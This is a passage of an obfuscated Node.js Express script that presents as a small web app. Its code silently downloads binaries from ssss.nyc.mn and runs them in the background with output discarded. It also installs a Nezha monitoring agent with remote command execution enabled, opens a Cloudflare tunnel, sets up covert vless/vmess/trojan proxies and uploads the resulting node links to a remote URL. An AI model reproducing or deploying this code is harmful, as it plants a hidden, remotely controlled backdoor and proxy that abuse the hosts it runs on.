const _0x16847c=_0x3657;(function(_0x2e9287,_0x38de66){const _0x49fdaf={_0x5b0d4d:0x150,_0x2c84ae:0x19f,_0x6b56f0:0x12d,_0x3da428:0x1ac,_0x8b9d1b:0x124},_0x4ce66e=_0x3657,_0x1660b4=_0x2e9287();while(!![]){try{const _0x126c88=-parseInt(_0x4ce66e(0x15c))/0x1+parseInt(_0x4ce66e(0x1bf))/0x2*(-parseInt(_0x4ce66e(_0x49fdaf._0x5b0d4d))/0x3)+-parseInt(_0x4ce66e(_0x49fdaf._0x2c84ae))/0x4+parseInt(_0x4ce66e(0x16e))/0x5+-parseInt(_0x4ce66e(_0x49fdaf._0x6b56f0))/0x6*(-parseInt(_0x4ce66e(_0x49fdaf._0x3da428))/0x7)+-parseInt(_0x4ce66e(0x147))/0x8+parseInt(_0x4ce66e(_0x49fdaf._0x8b9d1b))/0x9;if(_0x126c88===_0x38de66)break;else _0x1660b4['push'](_0x1660b4['shift']());}catch(_0x503e11){_0x1660b4['push'](_0x1660b4['shift']());}}}(_0x30b5,0x8dba9));const express=require('express'),app=express(),axios=require(_0x16847c(0x1c1)),os=require('os'),fs=require('fs'),path=require(_0x16847c(0x171)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x16847c(0x177)]),UPLOAD_URL=process[_0x16847c(0x1c7)][_0x16847c(0x195)]||'',PROJECT_URL=process['env'][_0x16847c(0x141)]||'',AUTO_ACCESS=process[_0x16847c(0x1c7)][_0x16847c(0x14f)]||![],FILE_PATH=process[_0x16847c(0x1c7)][_0x16847c(0x19a)]||'.tmp',SUB_PATH=process[_0x16847c(0x1c7)][_0x16847c(0x1c5)]||_0x16847c(0x1b8),PORT=process[_0x16847c(0x1c7)]['SERVER_PORT']||process[_0x16847c(0x1c7)][_0x16847c(0x1ad)]||0xbb8,UUID=process[_0x16847c(0x1c7)][_0x16847c(0x14b)]||'08cb7715-0207-4a46-8b48-269f093a17aa',NEZHA_SERVER=process[_0x16847c(0x1c7)]['NEZHA_SERVER']||_0x16847c(0x113),NEZHA_PORT=process[_0x16847c(0x1c7)][_0x16847c(0x13a)]||'',NEZHA_KEY=process[_0x16847c(0x1c7)][_0x16847c(0x121)]||_0x16847c(0x109),ARGO_DOMAIN=process[_0x16847c(0x1c7)][_0x16847c(0x1b9)]||_0x16847c(0x1bc),ARGO_AUTH=process['env'][_0x16847c(0x12b)]||_0x16847c(0x18c),ARGO_PORT=process['env'][_0x16847c(0x127)]||0x1f41,CFIP=process[_0x16847c(0x1c7)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x16847c(0x1c7)][_0x16847c(0x17f)]||0x1bb,NAME=process[_0x16847c(0x1c7)]['NAME']||_0x16847c(0x103);!fs[_0x16847c(0x16b)](FILE_PATH)?(fs[_0x16847c(0x17d)](FILE_PATH),console[_0x16847c(0x135)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x93fa99={_0x39e9a9:0x164,_0x4f4523:0x116},_0x3ebfd9=_0x16847c,_0x3f8c29=_0x3ebfd9(0x13f);let _0x160e4c='';for(let _0x597a3c=0x0;_0x597a3c<0x6;_0x597a3c++){_0x160e4c+=_0x3f8c29[_0x3ebfd9(0x1a1)](Math[_0x3ebfd9(0x110)](Math[_0x3ebfd9(_0x93fa99._0x39e9a9)]()*_0x3f8c29[_0x3ebfd9(_0x93fa99._0x4f4523)]));}return _0x160e4c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x16847c(0x187)](FILE_PATH,npmName),phpPath=path[_0x16847c(0x187)](FILE_PATH,phpName),webPath=path[_0x16847c(0x187)](FILE_PATH,webName),botPath=path[_0x16847c(0x187)](FILE_PATH,botName),subPath=path[_0x16847c(0x187)](FILE_PATH,_0x16847c(0x1be)),listPath=path[_0x16847c(0x187)](FILE_PATH,_0x16847c(0x179)),bootLogPath=path[_0x16847c(0x187)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x16847c(0x197));function deleteNodes(){const _0x2b0ad1={_0xc5d5a0:0x16b,_0xbf2985:0x123,_0x2c4c83:0x12e,_0x4b3e41:0x160,_0x1154d9:0x1c6,_0x5008b1:0x143},_0x3e2f46=_0x16847c;try{if(!UPLOAD_URL)return;if(!fs[_0x3e2f46(_0x2b0ad1._0xc5d5a0)](subPath))return;let _0x402162;try{_0x402162=fs['readFileSync'](subPath,_0x3e2f46(_0x2b0ad1._0xbf2985));}catch{return null;}const _0x2f0e59=Buffer[_0x3e2f46(0x18f)](_0x402162,_0x3e2f46(_0x2b0ad1._0x2c4c83))[_0x3e2f46(_0x2b0ad1._0x4b3e41)](_0x3e2f46(0x123)),_0x3da87e=_0x2f0e59[_0x3e2f46(0x16c)]('\x0a')[_0x3e2f46(0x129)](_0x5ef73e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3e2f46(0x15b)](_0x5ef73e));if(_0x3da87e['length']===0x0)return;return axios[_0x3e2f46(0x166)](UPLOAD_URL+_0x3e2f46(_0x2b0ad1._0x1154d9),JSON[_0x3e2f46(0x13e)]({'nodes':_0x3da87e}),{'headers':{'Content-Type':'application/json'}})[_0x3e2f46(_0x2b0ad1._0x5008b1)](_0xfa432c=>{return null;}),null;}catch(_0x584917){return null;}}function cleanupOldFiles(){const _0x3b2a68={_0x72ff66:0x151};try{const _0x445e30=fs['readdirSync'](FILE_PATH);_0x445e30['forEach'](_0x182d01=>{const _0x984a53=_0x3657,_0x3bc7d0=path[_0x984a53(0x187)](FILE_PATH,_0x182d01);try{const _0x423b1a=fs[_0x984a53(0x1b2)](_0x3bc7d0);_0x423b1a['isFile']()&&fs[_0x984a53(_0x3b2a68._0x72ff66)](_0x3bc7d0);}catch(_0x479b19){}});}catch(_0x2b3cac){}}async function generateConfig(){const _0x569e6f={_0x5525b6:0x132,_0x46858a:0x180,_0x4ba320:0x11c,_0x49cc69:0x170,_0x5a76b6:0x180,_0x3f4504:0x132,_0x5084cd:0x132,_0x44792c:0x1c4,_0x629e21:0x15f,_0x24dbcb:0x176,_0x586d9a:0x193,_0x1dda8f:0x176,_0x563512:0x1c3,_0x4b3d52:0x10a,_0x38b090:0x173,_0x1e535e:0x13e},_0x204158=_0x16847c,_0x5187e2={'log':{'access':'/dev/null','error':_0x204158(0x108),'loglevel':_0x204158(_0x569e6f._0x5525b6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x204158(_0x569e6f._0x46858a),'settings':{'clients':[{'id':UUID,'flow':_0x204158(0x159)}],'decryption':_0x204158(0x132),'fallbacks':[{'dest':0xbb9},{'path':_0x204158(0xff),'dest':0xbba},{'path':_0x204158(_0x569e6f._0x4ba320),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x204158(_0x569e6f._0x49cc69),'protocol':_0x204158(_0x569e6f._0x5a76b6),'settings':{'clients':[{'id':UUID}],'decryption':_0x204158(0x132)},'streamSettings':{'network':_0x204158(0x134),'security':_0x204158(_0x569e6f._0x3f4504)}},{'port':0xbba,'listen':_0x204158(_0x569e6f._0x49cc69),'protocol':_0x204158(0x180),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x204158(_0x569e6f._0x5084cd)},'streamSettings':{'network':'ws','security':_0x204158(0x132),'wsSettings':{'path':_0x204158(0xff)}},'sniffing':{'enabled':!![],'destOverride':[_0x204158(_0x569e6f._0x44792c),_0x204158(_0x569e6f._0x629e21),_0x204158(_0x569e6f._0x24dbcb)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x204158(0x1b5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x204158(0x11c)}},'sniffing':{'enabled':!![],'destOverride':[_0x204158(0x1c4),_0x204158(_0x569e6f._0x629e21),_0x204158(0x176)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x204158(0x170),'protocol':_0x204158(0x119),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x204158(_0x569e6f._0x5525b6),'wsSettings':{'path':_0x204158(_0x569e6f._0x586d9a)}},'sniffing':{'enabled':!![],'destOverride':[_0x204158(0x1c4),'tls',_0x204158(_0x569e6f._0x1dda8f)],'metadataOnly':![]}}],'dns':{'servers':[_0x204158(0x128)]},'outbounds':[{'protocol':'freedom','tag':_0x204158(_0x569e6f._0x563512)},{'protocol':_0x204158(_0x569e6f._0x4b3d52),'tag':_0x204158(_0x569e6f._0x38b090)}]};fs[_0x204158(0x1ab)](path['join'](FILE_PATH,'config.json'),JSON[_0x204158(_0x569e6f._0x1e535e)](_0x5187e2,null,0x2));}function getSystemArchitecture(){const _0x1bb383={_0x2c5145:0x1b4,_0xc112d5:0x1c8,_0x3179b7:0x1bd,_0x381b20:0x184},_0x39c473=_0x16847c,_0x4e22eb=os[_0x39c473(_0x1bb383._0x2c5145)]();return _0x4e22eb===_0x39c473(0x184)||_0x4e22eb===_0x39c473(_0x1bb383._0xc112d5)||_0x4e22eb===_0x39c473(_0x1bb383._0x3179b7)?_0x39c473(_0x1bb383._0x381b20):_0x39c473(0x13b);}function downloadFile(_0x4cadfa,_0x2eaaec,_0x315066){const _0x3a8d88={_0x3ffd9d:0x16b,_0x459039:0x17d,_0x4537e5:0x10c},_0x409f23={_0x3c9322:0x120},_0x36c357={_0x561bc6:0x1af,_0x2c8f1b:0x120,_0x47d644:0x18b},_0x2a76ef={_0x4381f2:0x135,_0x25d7de:0x137},_0x393899=_0x16847c,_0x1bdb14=_0x4cadfa;!fs[_0x393899(_0x3a8d88._0x3ffd9d)](FILE_PATH)&&fs[_0x393899(_0x3a8d88._0x459039)](FILE_PATH,{'recursive':!![]});const _0x2f0c70=fs['createWriteStream'](_0x1bdb14);axios({'method':_0x393899(0x1a6),'url':_0x2eaaec,'responseType':_0x393899(_0x3a8d88._0x4537e5)})['then'](_0x4b448a=>{const _0x5ac0c8=_0x393899;_0x4b448a['data'][_0x5ac0c8(0x186)](_0x2f0c70),_0x2f0c70['on'](_0x5ac0c8(0x18d),()=>{const _0x5e2bb4=_0x5ac0c8;_0x2f0c70['close'](),console[_0x5e2bb4(_0x2a76ef._0x4381f2)](_0x5e2bb4(_0x2a76ef._0x25d7de)+path[_0x5e2bb4(0x1af)](_0x1bdb14)+_0x5e2bb4(0x13c)),_0x315066(null,_0x1bdb14);}),_0x2f0c70['on'](_0x5ac0c8(0x1a9),_0x3629c5=>{const _0x1a38a6=_0x5ac0c8;fs[_0x1a38a6(0x19e)](_0x1bdb14,()=>{});const _0x502d73=_0x1a38a6(0x137)+path[_0x1a38a6(_0x36c357._0x561bc6)](_0x1bdb14)+_0x1a38a6(_0x36c357._0x2c8f1b)+_0x3629c5[_0x1a38a6(_0x36c357._0x47d644)];console['error'](_0x502d73),_0x315066(_0x502d73);});})['catch'](_0x1e8de2=>{const _0x42777b=_0x393899,_0x348e50='Download\x20'+path[_0x42777b(0x1af)](_0x1bdb14)+_0x42777b(_0x409f23._0x3c9322)+_0x1e8de2[_0x42777b(0x18b)];console[_0x42777b(0x1a9)](_0x348e50),_0x315066(_0x348e50);});}async function downloadFilesAndRun(){const _0x2243dc={_0x4ff71d:0x116,_0x1dabbe:0x1a5,_0xdda955:0x10e,_0x3c17ab:0x16c,_0x4d307d:0x101,_0x1ab915:0x1a4,_0x438383:0x14a,_0x28f9c9:0x154,_0x25002e:0x188,_0x88c572:0x1aa,_0x267b7d:0x1b0,_0x44583a:0xfe,_0x4fd25e:0x118,_0x53e4ea:0x1ab,_0x5333c6:0x14e,_0x329bf6:0x172,_0x5da6eb:0x122,_0x2dc5d8:0x139,_0x15607e:0x135,_0x3bbaab:0x165,_0x547ee2:0x190,_0x49417d:0x146,_0x227a05:0x181,_0x3b88ab:0x161,_0x2ff0b2:0x12a},_0x420b8d={_0xb18365:0x125},_0x17e79e={_0x41c468:0x11d,_0x447814:0x18a},_0x486210=_0x16847c,_0x2eaf6f=getSystemArchitecture(),_0x254d86=getFilesForArchitecture(_0x2eaf6f);if(_0x254d86[_0x486210(_0x2243dc._0x4ff71d)]===0x0){console[_0x486210(0x135)](_0x486210(0x16f));return;}const _0xa3c42c=_0x254d86[_0x486210(0x17a)](_0x4ed118=>{return new Promise((_0xec932a,_0x283c16)=>{const _0x2126fa=_0x3657;downloadFile(_0x4ed118[_0x2126fa(_0x17e79e._0x41c468)],_0x4ed118[_0x2126fa(_0x17e79e._0x447814)],(_0x302769,_0x283ecb)=>{_0x302769?_0x283c16(_0x302769):_0xec932a(_0x283ecb);});});});try{await Promise[_0x486210(0x1a3)](_0xa3c42c);}catch(_0xfc71d6){console['error'](_0x486210(_0x2243dc._0x1dabbe),_0xfc71d6);return;}function _0x154df9(_0x4bcfe9){const _0x1fad48={_0x32ed44:0x16b},_0x290477=_0x486210,_0x1a09ac=0x1fd;_0x4bcfe9[_0x290477(_0x420b8d._0xb18365)](_0x48e31a=>{const _0x194e02={_0x23e426:0x135,_0x9765d7:0x130},_0x1c22f6=_0x290477;fs[_0x1c22f6(_0x1fad48._0x32ed44)](_0x48e31a)&&fs['chmod'](_0x48e31a,_0x1a09ac,_0x178234=>{const _0x3c6b1d=_0x1c22f6;_0x178234?console['error']('Empowerment\x20failed\x20for\x20'+_0x48e31a+':\x20'+_0x178234):console[_0x3c6b1d(_0x194e02._0x23e426)](_0x3c6b1d(_0x194e02._0x9765d7)+_0x48e31a+':\x20'+_0x1a09ac['toString'](0x8));});});}const _0x2d87d0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x154df9(_0x2d87d0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2dd96c=NEZHA_SERVER[_0x486210(_0x2243dc._0xdda955)](':')?NEZHA_SERVER[_0x486210(_0x2243dc._0x3c17ab)](':')[_0x486210(0x196)]():'',_0x32f94a=new Set([_0x486210(0x12f),_0x486210(_0x2243dc._0x4d307d),_0x486210(_0x2243dc._0x1ab915),_0x486210(_0x2243dc._0x438383),_0x486210(_0x2243dc._0x28f9c9),_0x486210(0x1c2)]),_0x477270=_0x32f94a[_0x486210(_0x2243dc._0x25002e)](_0x2dd96c)?_0x486210(_0x2243dc._0x88c572):_0x486210(_0x2243dc._0x267b7d),_0x3d86ef=_0x486210(_0x2243dc._0x44583a)+NEZHA_KEY+_0x486210(0x106)+NEZHA_SERVER+_0x486210(_0x2243dc._0x4fd25e)+_0x477270+_0x486210(0x14c)+UUID;fs[_0x486210(_0x2243dc._0x53e4ea)](path['join'](FILE_PATH,_0x486210(_0x2243dc._0x5333c6)),_0x3d86ef);const _0x5c1249=_0x486210(0x190)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5c1249),console[_0x486210(0x135)](phpName+_0x486210(0x161)),await new Promise(_0xce51a9=>setTimeout(_0xce51a9,0x3e8));}catch(_0x441ed8){console[_0x486210(0x1a9)](_0x486210(_0x2243dc._0x329bf6)+_0x441ed8);}}else{let _0x517508='';const _0x256612=[_0x486210(0x12f),_0x486210(0x101),'2096','2087',_0x486210(_0x2243dc._0x28f9c9),'2053'];_0x256612['includes'](NEZHA_PORT)&&(_0x517508=_0x486210(0x131));const _0x50702f=_0x486210(0x190)+npmPath+_0x486210(0x198)+NEZHA_SERVER+':'+NEZHA_PORT+_0x486210(_0x2243dc._0x5da6eb)+NEZHA_KEY+'\x20'+_0x517508+_0x486210(_0x2243dc._0x2dc5d8);try{await exec(_0x50702f),console[_0x486210(_0x2243dc._0x15607e)](npmName+_0x486210(0x161)),await new Promise(_0x58c95b=>setTimeout(_0x58c95b,0x3e8));}catch(_0x5c18be){console[_0x486210(0x1a9)]('npm\x20running\x20error:\x20'+_0x5c18be);}}}else console[_0x486210(0x135)](_0x486210(_0x2243dc._0x3bbaab));const _0xe16226=_0x486210(_0x2243dc._0x547ee2)+webPath+_0x486210(_0x2243dc._0x49417d)+FILE_PATH+_0x486210(_0x2243dc._0x227a05);try{await exec(_0xe16226),console[_0x486210(0x135)](webName+_0x486210(_0x2243dc._0x3b88ab)),await new Promise(_0x1bf7ce=>setTimeout(_0x1bf7ce,0x3e8));}catch(_0x4b18ba){console[_0x486210(0x1a9)]('web\x20running\x20error:\x20'+_0x4b18ba);}if(fs['existsSync'](botPath)){let _0xc629aa;if(ARGO_AUTH[_0x486210(0x1b3)](/^[A-Z0-9a-z=]{120,250}$/))_0xc629aa=_0x486210(0x11b)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0xc629aa=_0x486210(0x17e)+FILE_PATH+_0x486210(_0x2243dc._0x2ff0b2):_0xc629aa='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x486210(0x190)+botPath+'\x20'+_0xc629aa+'\x20>/dev/null\x202>&1\x20&'),console[_0x486210(_0x2243dc._0x15607e)](botName+_0x486210(0x161)),await new Promise(_0x2c2694=>setTimeout(_0x2c2694,0x7d0));}catch(_0x94e1a7){console[_0x486210(0x1a9)]('Error\x20executing\x20command:\x20'+_0x94e1a7);}}await new Promise(_0x1748c4=>setTimeout(_0x1748c4,0x1388));}function getFilesForArchitecture(_0x2e6407){const _0x472b47={_0x5b9248:0x153,_0x50cd8a:0x105,_0x1dd981:0x175,_0x1cf42d:0x184,_0x2e9023:0x194},_0x17648d=_0x16847c;let _0x4959bb;_0x2e6407===_0x17648d(0x184)?_0x4959bb=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x17648d(_0x472b47._0x5b9248)}]:_0x4959bb=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x17648d(0x111)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4a3776=_0x2e6407===_0x17648d(0x184)?_0x17648d(_0x472b47._0x50cd8a):_0x17648d(_0x472b47._0x1dd981);_0x4959bb[_0x17648d(0x107)]({'fileName':npmPath,'fileUrl':_0x4a3776});}else{const _0x493684=_0x2e6407===_0x17648d(_0x472b47._0x1cf42d)?_0x17648d(0x11f):_0x17648d(_0x472b47._0x2e9023);_0x4959bb[_0x17648d(0x107)]({'fileName':phpPath,'fileUrl':_0x493684});}}return _0x4959bb;}function argoType(){const _0x400326={_0x305488:0x10e,_0x16f33f:0x187,_0x32a6cf:0x133,_0x55d4b1:0x16a,_0x4c557a:0x158,_0x8ffdd0:0x1ba,_0x545320:0x1ab,_0x3355b9:0x135},_0x2e826b=_0x16847c;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x2e826b(0x15a));return;}if(ARGO_AUTH[_0x2e826b(_0x400326._0x305488)]('TunnelSecret')){fs[_0x2e826b(0x1ab)](path[_0x2e826b(_0x400326._0x16f33f)](FILE_PATH,_0x2e826b(0x16a)),ARGO_AUTH);const _0x541fd7=_0x2e826b(_0x400326._0x32a6cf)+ARGO_AUTH[_0x2e826b(0x16c)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x2e826b(_0x400326._0x55d4b1))+_0x2e826b(_0x400326._0x4c557a)+ARGO_DOMAIN+_0x2e826b(_0x400326._0x8ffdd0)+ARGO_PORT+_0x2e826b(0x178);fs[_0x2e826b(_0x400326._0x545320)](path[_0x2e826b(_0x400326._0x16f33f)](FILE_PATH,_0x2e826b(0x1bb)),_0x541fd7);}else console[_0x2e826b(_0x400326._0x3355b9)](_0x2e826b(0x191));}async function extractDomains(){const _0x2d4d3c={_0x1a91ac:0x187,_0x2c90f6:0x11a,_0x4aaaa8:0x125,_0x59433e:0x116,_0x8c6b3d:0x135,_0x734a35:0x135,_0x2eb4ad:0x11a,_0x659405:0x1a9,_0x35573e:0x114},_0x72f530={_0x43b106:0x1a6,_0x4e015f:0x10b,_0x1d4e36:0x126,_0x4b2bb7:0x11e,_0x323e4a:0x10b,_0x3c5753:0x15e},_0x1d2695={_0x5cf884:0x199,_0x4628b1:0x136},_0x2a711f={_0x15dba3:0x112},_0x706281=_0x16847c;let _0x43e4f6;if(ARGO_AUTH&&ARGO_DOMAIN)_0x43e4f6=ARGO_DOMAIN,console[_0x706281(0x135)](_0x706281(0x152),_0x43e4f6),await _0x1e984c(_0x43e4f6);else try{const _0x22ee9f=fs[_0x706281(0x145)](path[_0x706281(_0x2d4d3c._0x1a91ac)](FILE_PATH,_0x706281(_0x2d4d3c._0x2c90f6)),_0x706281(0x123)),_0x47e30e=_0x22ee9f[_0x706281(0x16c)]('\x0a'),_0x8d3730=[];_0x47e30e[_0x706281(_0x2d4d3c._0x4aaaa8)](_0x42f544=>{const _0x3d0175=_0x706281,_0x45e3ef=_0x42f544[_0x3d0175(0x1b3)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x45e3ef){const _0x521910=_0x45e3ef[0x1];_0x8d3730[_0x3d0175(_0x2a711f._0x15dba3)](_0x521910);}});if(_0x8d3730[_0x706281(_0x2d4d3c._0x59433e)]>0x0)_0x43e4f6=_0x8d3730[0x0],console[_0x706281(_0x2d4d3c._0x8c6b3d)](_0x706281(0x19d),_0x43e4f6),await _0x1e984c(_0x43e4f6);else{console[_0x706281(_0x2d4d3c._0x734a35)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x706281(0x151)](path['join'](FILE_PATH,_0x706281(_0x2d4d3c._0x2eb4ad)));async function _0x11d454(){const _0xff0aec=_0x706281;try{process[_0xff0aec(_0x1d2695._0x5cf884)]==='win32'?await exec(_0xff0aec(0x104)+botName+_0xff0aec(0x14d)):await exec(_0xff0aec(0x115)+botName[_0xff0aec(0x1a1)](0x0)+']'+botName[_0xff0aec(0x148)](0x1)+_0xff0aec(_0x1d2695._0x4628b1));}catch(_0x257e18){}}_0x11d454(),await new Promise(_0x32c9d3=>setTimeout(_0x32c9d3,0xbb8));const _0x4994dc=_0x706281(0x19b)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x706281(0x190)+botPath+'\x20'+_0x4994dc+_0x706281(0x140)),console[_0x706281(_0x2d4d3c._0x734a35)](botName+_0x706281(0x161)),await new Promise(_0x4d2108=>setTimeout(_0x4d2108,0xbb8)),await extractDomains();}catch(_0x52c99d){console[_0x706281(_0x2d4d3c._0x659405)](_0x706281(_0x2d4d3c._0x35573e)+_0x52c99d);}}}catch(_0x13c18e){console[_0x706281(0x1a9)]('Error\x20reading\x20boot.log:',_0x13c18e);}async function _0x1cdaef(){const _0x305dec=_0x706281;try{const _0x569cd5=await axios[_0x305dec(_0x72f530._0x43b106)]('https://ipapi.co/json',{'timeout':0xbb8});if(_0x569cd5[_0x305dec(_0x72f530._0x4e015f)]&&_0x569cd5[_0x305dec(0x10b)][_0x305dec(_0x72f530._0x1d4e36)]&&_0x569cd5[_0x305dec(0x10b)][_0x305dec(0x168)])return _0x569cd5[_0x305dec(_0x72f530._0x4e015f)][_0x305dec(0x126)]+'_'+_0x569cd5['data'][_0x305dec(0x168)];}catch(_0x323b3c){try{const _0x5a7af4=await axios[_0x305dec(0x1a6)](_0x305dec(_0x72f530._0x4b2bb7),{'timeout':0xbb8});if(_0x5a7af4[_0x305dec(0x10b)]&&_0x5a7af4[_0x305dec(_0x72f530._0x4e015f)]['status']===_0x305dec(0x102)&&_0x5a7af4[_0x305dec(_0x72f530._0x323e4a)][_0x305dec(0x138)]&&_0x5a7af4['data']['org'])return _0x5a7af4[_0x305dec(_0x72f530._0x323e4a)]['countryCode']+'_'+_0x5a7af4[_0x305dec(_0x72f530._0x4e015f)]['org'];}catch(_0x4c3184){}}return _0x305dec(_0x72f530._0x3c5753);}async function _0x1e984c(_0x569daf){const _0xe75026={_0x1231eb:0x132,_0x64addf:0x142,_0x1bb067:0x12c,_0x4de8ba:0x13e,_0x1b2bba:0x160,_0x124d68:0x12e,_0x42034a:0x12c,_0xde574f:0x10d,_0x1cef6d:0x18f,_0x107768:0x160},_0x53955a=await _0x1cdaef(),_0x21194b=NAME?NAME+'-'+_0x53955a:_0x53955a;return new Promise(_0x4942b9=>{setTimeout(()=>{const _0x499014={_0x16f91f:0x163},_0x3b0ae2=_0x3657,_0x13d652={'v':'2','ps':''+_0x21194b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3b0ae2(_0xe75026._0x1231eb),'net':'ws','type':'none','host':_0x569daf,'path':_0x3b0ae2(0x155),'tls':_0x3b0ae2(0x15f),'sni':_0x569daf,'alpn':'','fp':_0x3b0ae2(_0xe75026._0x64addf)},_0x1d1435=_0x3b0ae2(0x16d)+UUID+'@'+CFIP+':'+CFPORT+_0x3b0ae2(0x182)+_0x569daf+_0x3b0ae2(_0xe75026._0x1bb067)+_0x569daf+_0x3b0ae2(0x1b7)+_0x21194b+_0x3b0ae2(0x1b6)+Buffer[_0x3b0ae2(0x18f)](JSON[_0x3b0ae2(_0xe75026._0x4de8ba)](_0x13d652))[_0x3b0ae2(_0xe75026._0x1b2bba)](_0x3b0ae2(_0xe75026._0x124d68))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x3b0ae2(0x1a2)+_0x569daf+_0x3b0ae2(_0xe75026._0x42034a)+_0x569daf+_0x3b0ae2(_0xe75026._0xde574f)+_0x21194b+_0x3b0ae2(0x18e);console['log'](Buffer[_0x3b0ae2(_0xe75026._0x1cef6d)](_0x1d1435)[_0x3b0ae2(_0xe75026._0x1b2bba)](_0x3b0ae2(_0xe75026._0x124d68))),fs[_0x3b0ae2(0x1ab)](subPath,Buffer[_0x3b0ae2(_0xe75026._0x1cef6d)](_0x1d1435)[_0x3b0ae2(_0xe75026._0x107768)](_0x3b0ae2(0x12e))),console[_0x3b0ae2(0x135)](FILE_PATH+_0x3b0ae2(0x17b)),uploadNodes(),app[_0x3b0ae2(0x1a6)]('/'+SUB_PATH,(_0x1ac7b2,_0x3309fd)=>{const _0x11f923=_0x3b0ae2,_0x49e327=Buffer[_0x11f923(0x18f)](_0x1d1435)[_0x11f923(0x160)](_0x11f923(0x12e));_0x3309fd['set'](_0x11f923(_0x499014._0x16f91f),_0x11f923(0x192)),_0x3309fd['send'](_0x49e327);}),_0x4942b9(_0x1d1435);},0x7d0);});}}async function uploadNodes(){const _0x3a8a3d={_0x115fd4:0x166,_0x52c057:0x1a7,_0x2c5078:0x16c,_0xf2a61:0x129,_0x346060:0x116,_0x583025:0x13e,_0x531291:0x174,_0x19e7ac:0x10f},_0xe7ef1e=_0x16847c;if(UPLOAD_URL&&PROJECT_URL){const _0x5bc850=PROJECT_URL+'/'+SUB_PATH,_0x83fac5={'subscription':[_0x5bc850]};try{const _0x57ec36=await axios[_0xe7ef1e(_0x3a8a3d._0x115fd4)](UPLOAD_URL+_0xe7ef1e(0x19c),_0x83fac5,{'headers':{'Content-Type':_0xe7ef1e(0x157)}});return _0x57ec36&&_0x57ec36['status']===0xc8?(console[_0xe7ef1e(0x135)](_0xe7ef1e(_0x3a8a3d._0x52c057)),_0x57ec36):null;}catch(_0x148456){if(_0x148456[_0xe7ef1e(0x167)]){if(_0x148456['response'][_0xe7ef1e(0x174)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x1754e1=fs['readFileSync'](listPath,'utf-8'),_0x5a6d06=_0x1754e1[_0xe7ef1e(_0x3a8a3d._0x2c5078)]('\x0a')[_0xe7ef1e(_0x3a8a3d._0xf2a61)](_0x5dd634=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xe7ef1e(0x15b)](_0x5dd634));if(_0x5a6d06[_0xe7ef1e(_0x3a8a3d._0x346060)]===0x0)return;const _0x23abb8=JSON[_0xe7ef1e(_0x3a8a3d._0x583025)]({'nodes':_0x5a6d06});try{const _0x519b32=await axios[_0xe7ef1e(0x166)](UPLOAD_URL+_0xe7ef1e(0x162),_0x23abb8,{'headers':{'Content-Type':'application/json'}});return _0x519b32&&_0x519b32[_0xe7ef1e(_0x3a8a3d._0x531291)]===0xc8?(console['log'](_0xe7ef1e(_0x3a8a3d._0x19e7ac)),_0x519b32):null;}catch(_0x555f1b){return null;}}else return;}}function _0x30b5(){const _0x2a235a=['axios','2053','direct','http','SUB_PATH','/api/delete-nodes','env','arm64','\x0aclient_secret:\x20','/vless-argo','\x20>/dev/null\x202>&1','8443','success','Galaxy','taskkill\x20/f\x20/im\x20','https://arm64.ssss.nyc.mn/agent','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','unshift','/dev/null','1FyZCXk9XGSarBQrCVE8WjyzXTfJFqH4','blackhole','data','stream','&path=%2Ftrojan-argo%3Fed%3D2560#','includes','Nodes\x20uploaded\x20successfully','floor','https://amd64.ssss.nyc.mn/bot','push','agn.xinxi.pp.ua:443','Error\x20executing\x20command:\x20','pkill\x20-f\x20\x22[','length','App\x20is\x20running','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','trojan','boot.log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/vmess-arg